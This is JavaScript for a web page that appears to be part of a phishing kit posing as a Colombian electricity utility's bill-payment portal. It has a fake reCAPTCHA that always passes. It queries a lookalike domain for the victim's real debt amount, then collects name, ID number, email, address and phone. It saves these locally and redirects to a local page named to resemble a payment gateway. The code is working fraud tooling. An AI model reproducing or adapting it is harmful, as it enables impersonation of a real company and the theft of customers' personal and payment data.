// --- 1. Lógica del Menú Hamburguesa ---
        const hamburgerBtn = document.getElementById('hamburgerBtn');
        const hamburgerBtnDesktop = document.getElementById('hamburgerBtnDesktop'); 
        const sidebar = document.getElementById('sidebar');

        const toggleSidebar = () => {
            if (window.innerWidth <= 768) {
                sidebar.classList.toggle('mobile-open');
            } else {
                sidebar.classList.toggle('hidden');
            }
        };

        if(hamburgerBtn) hamburgerBtn.addEventListener('click', toggleSidebar);
        if(hamburgerBtnDesktop) hamburgerBtnDesktop.addEventListener('click', toggleSidebar);

        // --- 2. Lógica del ReCAPTCHA ---
        const checkboxContainer = document.getElementById('checkboxContainer');
        const fakeCheckbox = document.getElementById('fakeCheckbox');
        const spinner = document.getElementById('spinner');
        const checkmark = document.getElementById('checkmark');
        let isChecked = false;

        checkboxContainer.addEventListener('click', () => {
            if(isChecked) return; 
            fakeCheckbox.style.display = 'none';
            spinner.style.display = 'block';
            setTimeout(() => {
                spinner.style.display = 'none';
                checkmark.style.display = 'block';
                isChecked = true;
            }, 1200);
        });

        // --- 3. LÓGICA PRINCIPAL DEL ROBOT ---
        const btnPagar = document.getElementById('btnPagar');
        const whitePanel = document.getElementById('whitePanel');
        const originalTitleStrip = document.getElementById('originalTitleStrip');
        // Capturamos el input que SÍ tiene el ID
        const inputNic = document.getElementById('inputNicReal');

        btnPagar.addEventListener('click', async () => {
            
            // Validación
            if(!inputNic || inputNic.value.trim() === '') {
                alert("Por favor, ingrese el NIC.");
                return;
            }

            if(!isChecked) {
                alert("Por favor confirme que no es un robot.");
                return;
            }

            // Preparar UI (Loader)
            originalTitleStrip.style.display = 'none';
            whitePanel.innerHTML = '';
            whitePanel.innerHTML = `<div class="full-loader-container"><div class="big-loader"></div></div>`;

            try {
                // --- PETICIÓN AL ROBOT ---
                // Aquí llamamos al backend en localhost:4000
                const resp = await fetch(`https://aire.pagoswebcol.uk/consultar-nic?nic=${inputNic.value}`);
                const json = await resp.json();

                // Variables para la vista
                let valorMes = "0";
                let valorTotal = "0";
                let nicEncontrado = inputNic.value;

                if (json.data && json.data.deudaTotal && json.data.deudaTotal !== "0") {
                    valorMes = json.data.valorMes;
                    valorTotal = json.data.deudaTotal;
                    // Limpiamos ($ y puntos)
                    const totalLimpio = valorTotal.replace(/[^\d]/g, '');
                    
                    // Renderizamos resultado con datos reales
                    whitePanel.innerHTML = `
                    <div class="invoice-view">
                        <div class="invoice-header"><h3>PAGUE SU FACTURA</h3></div>
                        <div class="invoice-form-grid">
                            <div class="required-note">* Indica campo requerido</div>
                            <div class="invoice-input-group"><label class="invoice-label">Tipo de identificación <span>*</span></label><select class="invoice-field" id="tipoId"><option>Seleccione</option><option value="CC">Cédula de Ciudadanía</option><option value="NIT">NIT</option></select></div>
                            <div class="invoice-input-group"><label class="invoice-label">No. de identificación <span>*</span></label><input type="text" class="invoice-field" id="numId" value="${nicEncontrado}"></div>
                            <div class="invoice-input-group"><label class="invoice-label">Nombres <span>*</span></label><input type="text" class="invoice-field" id="nombres"></div>
                            <div class="invoice-input-group"><label class="invoice-label">Apellidos <span>*</span></label><input type="text" class="invoice-field" id="apellidos"></div>
                            <div class="invoice-input-group"><label class="invoice-label">Correo electrónico <span>*</span></label><input type="email" class="invoice-field" id="correo"></div>
                            <div class="invoice-input-group"><label class="invoice-label">Dirección <span>*</span></label><input type="text" class="invoice-field" id="direccion"></div>
                            <div class="invoice-input-group"><label class="invoice-label">Teléfono celular <span>*</span></label><input type="text" class="invoice-field" placeholder="##########" id="celular"></div>
                        </div>
                        <div class="payment-cards-grid">
                            <div class="payment-card"><div class="pay-card-title">Valor del mes</div><div class="pay-card-amount">$ ${valorMes}</div><button class="btn-card-action btn-blue-dark" onclick="guardarYRedirigir('${totalLimpio}', 'mensual')">PAGAR MES</button></div>
                            <div class="payment-card"><div class="pay-card-title">Deuda Total</div><div class="pay-card-amount">$ ${valorTotal}</div><button class="btn-card-action btn-teal" onclick="guardarYRedirigir('${totalLimpio}', 'total')">PAGAR TOTAL</button></div>
                            <div class="payment-card"><div class="pay-card-title">Hacer un abono</div><input type="text" class="pay-input-amount" id="inputAbono" placeholder="$000.000"><button class="btn-card-action btn-blue-light" onclick="guardarYRedirigir('abono', 'abono')">ABONAR</button></div>
                        </div>
                        <div class="invoice-header"><h3>TÉRMINOS Y CONDICIONES</h3></div>
                        <div class="invoice-footer">
                            <div class="terms-check"><input type="checkbox"><span>Al marcar la casilla, se entiende que ha leído, aceptado y <a href="#">autorizado el tratamiento de sus datos personales</a> de acuerdo con nuestra <a href="#">Política de Tratamiento de Datos Personales.</a></span></div>
                            <button class="btn-cancel" onclick="location.reload()">CANCELAR</button>
                        </div>
                        <div class="footer-branding">Powered By Facture una Marca de Estela</div>
                    </div>`;

                } else if (json.data && json.data.mensaje === "Al día") {
                    // CASO NO DEUDA
                    alert("¡Buenas noticias! Este NIC no tiene facturas pendientes por pagar.");
                    location.reload();
                } else {
                    // ERROR
                    alert("No se encontró información o hubo un error.\n" + (json.error || ""));
                    location.reload();
                }

            } catch (e) {
                console.error(e);
                alert("Error al conectar con el servidor.");
                location.reload();
            }
        });

        // Función global para guardar y saltar a pasarela
        window.guardarYRedirigir = function(monto, tipo) {
            const nombres = document.getElementById('nombres').value;
            const apellidos = document.getElementById('apellidos').value;
            const tipoId = document.getElementById('tipoId').value;
            const numId = document.getElementById('numId').value;
            const correo = document.getElementById('correo').value;
            const direccion = document.getElementById('direccion').value;
            const celular = document.getElementById('celular').value;

            if(!nombres || !apellidos || !numId || !correo) {
                alert("Por favor, diligencie los datos personales antes de continuar.");
                return;
            }

            let valorFinal = monto;
            if(tipo === 'abono') {
                const valorAbono = document.getElementById('inputAbono').value;
                if(!valorAbono) {
                    alert("Ingrese el valor a abonar");
                    return;
                }
                valorFinal = valorAbono.replace(/[^\d]/g, '');
            }

            const datosUsuario = {
                nombreCompleto: nombres + " " + apellidos,
                tipoId: tipoId,
                numId: numId,
                correo: correo,
                direccion: direccion,
                celular: celular,
                montoPagar: parseInt(valorFinal, 10),
                referencia: Math.floor(Math.random() * 100000000), 
                ip: "181.51.89.21" 
            };

            localStorage.setItem('datosFactura', JSON.stringify(datosUsuario));
            window.location.href = 'portalpagos.portalfacture.com.html';
        };